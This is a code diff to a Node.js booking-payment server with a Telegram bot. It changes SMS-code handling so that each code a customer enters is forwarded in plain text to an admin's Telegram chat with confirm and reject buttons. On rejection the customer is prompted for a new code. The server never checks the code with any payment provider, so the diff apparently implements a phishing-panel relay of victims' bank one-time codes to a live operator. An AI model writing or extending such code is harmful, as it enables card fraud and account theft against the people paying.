@@ -180,6 +180,10 @@ async function handleCallbackQuery(callbackQuery) {
     await handleSendSMS(bookingId, chatId, id);
   } else if (action === 'decline') {
     await handleDecline(bookingId, chatId, id);
+  } else if (action === 'confirm_code') {
+    await handleConfirmCode(bookingId, chatId, id);
+  } else if (action === 'reject_code') {
+    await handleRejectCode(bookingId, chatId, id);
   }
 }
 
@@ -251,6 +255,74 @@ async function handleDecline(bookingId, chatId, callbackId) {
   });
 }
 
+async function handleConfirmCode(bookingId, chatId, callbackId) {
+  console.log(`✅ Code confirmed for booking ${bookingId}`);
+  
+  // Find the payment session
+  const session = paymentSessions.get(bookingId);
+  if (!session) {
+    await answerCallbackQuery(callbackId, '❌ Session not found');
+    return;
+  }
+  
+  // Update session to verified
+  session.status = 'verified';
+  paymentSessions.set(bookingId, session);
+  
+  // Notify Telegram admin
+  await sendTelegramMessage(chatId, 
+    `✅ Код подтвержден!\n\n📱 Код: <code>${session.receivedSmsCode}</code>\n🆔 ID заказа: <code>${bookingId}</code>\n🎉 Оплата завершена!`,
+    'HTML'
+  );
+  
+  // Answer callback query
+  await answerCallbackQuery(callbackId, '✅ Код подтвержден!');
+  
+  // Notify client of successful verification
+  notifyClient(bookingId, {
+    action: 'payment_verified',
+    message: 'Оплата успешно подтверждена!'
+  });
+  
+  // Clean up session after some time
+  setTimeout(() => {
+    paymentSessions.delete(bookingId);
+    console.log(`🧹 Session ${bookingId} cleaned up after confirmation`);
+  }, 60000);
+}
+
+async function handleRejectCode(bookingId, chatId, callbackId) {
+  console.log(`❌ Code rejected for booking ${bookingId}`);
+  
+  // Find the payment session
+  const session = paymentSessions.get(bookingId);
+  if (!session) {
+    await answerCallbackQuery(callbackId, '❌ Session not found');
+    return;
+  }
+  
+  // Reset session to allow new code input
+  session.status = 'sms_sent';
+  session.receivedSmsCode = null;
+  session.codeSubmittedAt = null;
+  paymentSessions.set(bookingId, session);
+  
+  // Notify Telegram admin
+  await sendTelegramMessage(chatId, 
+    `❌ Код отклонен\n\n📱 Код был: <code>${session.receivedSmsCode || 'неизвестен'}</code>\n🆔 ID заказа: <code>${bookingId}</code>\n🔄 Клиент может ввести новый код`,
+    'HTML'
+  );
+  
+  // Answer callback query
+  await answerCallbackQuery(callbackId, '❌ Код отклонен');
+  
+  // Notify client to try again
+  notifyClient(bookingId, {
+    action: 'code_rejected',
+    message: 'Код отклонен. Попробуйте ввести другой код.'
+  });
+}
+
 // Create payment session
 app.post('/api/payment/create-session', (req, res) => {
   const { bookingId, orderData } = req.body;
@@ -306,21 +378,38 @@ app.post('/api/payment/verify-sms', (req, res) => {
     return res.status(400).json({ error: 'SMS code must be 6 digits' });
   }
   
-  // Success!
-  console.log(`✅ SMS code verified for ${bookingId}`);
-  session.status = 'verified';
+  // Store the code and wait for admin confirmation
+  console.log(`📱 SMS code received: ${smsCode}, waiting for admin confirmation`);
+  session.receivedSmsCode = smsCode;
+  session.status = 'awaiting_confirmation';
+  session.codeSubmittedAt = Date.now();
   paymentSessions.set(bookingId, session);
   
-  // Clean up session after some time
-  setTimeout(() => {
-    paymentSessions.delete(bookingId);
-    console.log(`🧹 Session ${bookingId} cleaned up`);
-  }, 60000); // 1 minute
+  // Send confirmation request to Telegram admin
+  const inlineKeyboard = {
+    inline_keyboard: [[
+      { text: '✅ Подтвердить код', callback_data: `confirm_code:${bookingId}` },
+      { text: '❌ Неверный код', callback_data: `reject_code:${bookingId}` }
+    ]]
+  };
   
-  console.log(`🎉 Payment verification successful for ${bookingId}`);
+  sendTelegramMessage(
+    TELEGRAM_CONFIG.ADMIN_CHAT_ID,
+    `🔐 Клиент ввел SMS код: <code>${smsCode}</code>\n\n🆔 ID заказа: <code>${bookingId}</code>\n\n❓ Подтвердить код?`,
+    'HTML',
+    inlineKeyboard
+  );
+  
+  // Notify client to wait for confirmation
+  notifyClient(bookingId, {
+    action: 'awaiting_confirmation',
+    message: 'Код отправлен на проверку администратору...'
+  });
+  
+  console.log(`⏳ Code submitted, waiting for admin confirmation for ${bookingId}`);
   res.json({ 
     success: true, 
-    message: 'Payment verified successfully' 
+    message: 'Code submitted, waiting for confirmation' 
   });
 });
 
@@ -385,16 +474,22 @@ function notifyClient(bookingId, data) {
 }
 
 // Telegram API helpers
-async function sendTelegramMessage(chatId, text, parseMode = 'HTML') {
+async function sendTelegramMessage(chatId, text, parseMode = 'HTML', replyMarkup = null) {
   try {
+    const messageData = {
+      chat_id: chatId,
+      text: text,
+      parse_mode: parseMode
+    };
+    
+    if (replyMarkup) {
+      messageData.reply_markup = replyMarkup;
+    }
+    
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: text,
-        parse_mode: parseMode
-      })
+      body: JSON.stringify(messageData)
     });
     
     if (!response.ok) {
